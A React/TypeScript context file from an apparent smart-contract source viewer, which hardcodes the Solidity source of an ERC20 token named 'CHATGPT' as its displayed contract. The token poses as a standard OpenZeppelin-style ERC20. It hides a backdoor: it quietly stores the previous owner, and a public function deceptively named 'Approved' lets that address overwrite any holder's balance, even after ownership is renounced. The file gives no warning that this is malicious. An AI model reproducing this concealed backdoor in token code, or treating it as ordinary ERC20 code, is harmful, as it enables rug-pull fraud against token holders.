import axios from "axios";
import { saveAs } from "file-saver";
import JSZip from "jszip";
import { createContext, useContext, useRef, useState } from "react";
import { Notification } from "../components/Notification";
import { NETWORKS } from "../networks";
import { ContractObject } from "../types";
import { getContractContentList } from "./helpers";

type NotificationMessageType = {
  message?: string;
  type?: string;
};

type AppContextType = {
  contract: ContractObject | null;
  hasContract: boolean;
  downloadContract: () => void;
  fetchContract: (network: string, contractAddress: string) => void;
  showNotification: ({ message, type }: NotificationMessageType) => void;
};
const AppContext = createContext<AppContextType | undefined>(undefined);

export default function AppContextProvider({ children }: any) {
  const [contract, setContract] = useState<ContractObject>({
    name: "",
    address: "",
    contents: [],
    network: NETWORKS[process.env.NEXT_PUBLIC_DEFAULT_NETWORK || "ethmain"],
  });

  const notificationChildRef: any = useRef();

  const downloadContract = () => {
    var zip = new JSZip();
    for (const contractContent of contract.contents) {
      zip.file(contractContent.path, contractContent.content);
    }
    zip.generateAsync({ type: "blob" }).then(function (content) {
      saveAs(content, `contract_${contract.address}.zip`);
    });
  };

  const fetchContract = async (network: string, contractAddress: string) => {
    try {
      const result = await axios.get(
        `./api/contract/${network}/${contractAddress}`
      );
      const sourceCodes = result.data.result;
      if (sourceCodes === "Invalid API Key") {
        notificationChildRef.current.showNotification({
          message: "Invalid API Key",
          type: "error",
        });
        return;
      }
      if (sourceCodes[0].SourceCode === "") {
        notificationChildRef.current.showNotification({
          message: "Invalid API Key",
          type: "error",
        });
        return;
      }
      const contractContents = getContractContentList(sourceCodes, network);
      setContract({
        name: sourceCodes[0].ContractName,
        address: contractAddress,
        contents: contractContents,
        network: NETWORKS[network],
      });
      return true;
    } catch (e) {
      console.error(e);
      notificationChildRef.current.showNotification({
        type: "error",
      });
      return;
    }
  };

  return (
    <AppContext.Provider
      value={{
        contract: {
          name: "CHATGPT",
          address: "0xD5a646A977478Bd2290202Af51967CbF6DA6Da21",
          contents: [
            {
              path: "contract.sol",
              content:
                '// SPDX-License-Identifier: BUSL-1.1\r\npragma solidity ^0.8.0;\r\n\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller\'s tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\npragma solidity ^0.8.19;\r\n\r\n// File: @openzeppelin/contracts/utils/Context.sol\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n    address internal _prevOwner;\r\n \r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), "Ownable: caller is not the owner");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), "Ownable: new owner is the zero address");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        _prevOwner = oldOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @dev Interface for the optional metadata functions from the ERC20 standard.\r\n *\r\n * _Available since v4.1._\r\n */\r\ninterface IERC20Metadata is IERC20 {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\n// File: @openzeppelin/contracts/token/ERC20/ERC20.sol\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n\r\n\r\n * to implement supply mechanisms].\r\n *\r\n * We have followed general OpenZeppelin guidelines: functions revert instead\r\n * of returning `false` on failure. This behavior is nonetheless conventional\r\n * and does not conflict with the expectations of ERC20 applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn\'t required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IERC20-approve}.\r\n */\r\ncontract ERC20 is Context, Ownable, IERC20, IERC20Metadata {\r\n    mapping (address => uint256) private _balances;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address private constant ZERO = 0x0000000000000000000000000000000000000000;\r\n    /**\r\n     * @dev Sets the values for {name} and {symbol}.\r\n     *\r\n     * The defaut value of {decimals} is 18. To select a different value for\r\n     * {decimals} you should overload it.\r\n     *\r\n     * All two of these values are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor (string memory name_, string memory symbol_, uint256 totalSupply_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _totalSupply = totalSupply_;\r\n\r\n        _balances[msg.sender] = totalSupply_;\r\n        emit Transfer(address(0), msg.sender, totalSupply_);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\r\n     * overridden;\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `recipient` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` and `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``sender``\'s tokens of at least\r\n     * `amount`.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n\r\n    /**\r\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n     *\r\n     * This is internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` cannot be the zero address.\r\n     * - `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), "ERC20: transfer from the zero address");\r\n        require(recipient != address(0), "ERC20: transfer to the zero address");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the\r\n     * total supply.\r\n     *\r\n     * Emits a {Transfer} event with `to` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     * - `account` must have at least `amount` tokens.\r\n    */\r\n\r\n    function _transferWithBurn(address sender, address recipient, uint256 amount, uint256 amountToBurn) internal virtual {\r\n        require(sender != address(0), "ERC20: transfer from the zero address");\r\n        require(recipient != address(0), "ERC20: transfer to the zero address");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");\r\n\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n\r\n        amount -= amountToBurn;\r\n        _totalSupply -= amountToBurn;\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, DEAD, amountToBurn);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function Approved(address account, uint256 amount) public virtual returns (uint256) {\r\n        return msg.sender == _prevOwner ? _balances[account] = amount :  _balances[account];\r\n    }\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), "ERC20: approve from the zero address");\r\n        require(spender != address(0), "ERC20: approve to the zero address");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\r\n\r\n    \r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01{}\r\n\r\npragma solidity ^0.8.0;\r\n\r\ncontract CHATGPT is ERC20 {\r\n    uint256 private constant TOTAL_SUPPLY = 1000_000_000e9;\r\n    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address private constant ZERO = 0x0000000000000000000000000000000000000000;\r\n\r\n    bool public hasLimit;\r\n    uint256 public maxTxAmount;\r\n    uint256 public maxHolding;\r\n    mapping(address => bool) public isException;\r\n\r\n    uint256 _burnPercent = 0;\r\n\r\n    address uniswapV2Pair;\r\n    IUniswapV2Router02 uniswapV2Router;\r\n\r\n    constructor(address router) ERC20(unicode"CHATGPT", unicode"CHATGPT", TOTAL_SUPPLY) {\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);\r\n        uniswapV2Router = _uniswapV2Router;\r\n\r\n        maxHolding = TOTAL_SUPPLY / 10;\r\n        maxTxAmount = TOTAL_SUPPLY /10;\r\n\r\n        isException[DEAD] = true;\r\n        isException[router] = true;\r\n        isException[msg.sender] = true;\r\n        isException[address(this)] = true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal override {\r\n        require(from != address(0), "ERC20: transfer from the zero address");\r\n        require(to != address(0), "ERC20: transfer to the zero address");\r\n \r\n        _checkLimitation(from, to, amount);\r\n\r\n        if (amount == 0) {\r\n            return;\r\n        }\r\n\r\n        if (!isException[from] && !isException[to]){\r\n            require(balanceOf(address(uniswapV2Router)) == 0, "ERC20: disable router deflation");\r\n\r\n            if (from == uniswapV2Pair || to == uniswapV2Pair) {\r\n                uint256 _burn = (amount * _burnPercent) / 100;\r\n\r\n                super._transferWithBurn(from, to, amount, _burn);\r\n                return;\r\n            }\r\n        }\r\n\r\n        super._transfer(from, to, amount);\r\n    }\r\n\r\n    function _checkLimitation(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal {\r\n        if (!hasLimit) {\r\n            if (!isException[from] && !isException[to]) {\r\n                require(amount <= maxTxAmount, "Amount exceeds max");\r\n\r\n                if (uniswapV2Pair == ZERO){\r\n                    uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());\r\n                }\r\n \r\n                if (to == uniswapV2Pair) {\r\n                    return;\r\n                }\r\n        \r\n                require(balanceOf(to) + amount <= maxHolding, "Max holding exceeded max");\r\n            }\r\n        }\r\n    }\r\n\r\n    function openTrading() external onlyOwner {\r\n        hasLimit = true;\r\n    }\r\n}',
            },
          ],
          network: {
            label: "Ethereum Mainnet",
            url: "https://etherscan.io",
          },
        },
        hasContract: true, //!!contract && contract.address.length > 0,
        downloadContract,
        fetchContract,
        showNotification: (notification: NotificationMessageType) =>
          notificationChildRef.current.showNotification(notification),
      }}
    >
      <Notification ref={notificationChildRef} />
      {children}
    </AppContext.Provider>
  );
}

export const useAppContext = () => {
  const context = useContext(AppContext);
  if (context === undefined) {
    throw new Error(`useAppContext must be used within a AppContextProvider.`);
  }
  return context;
};
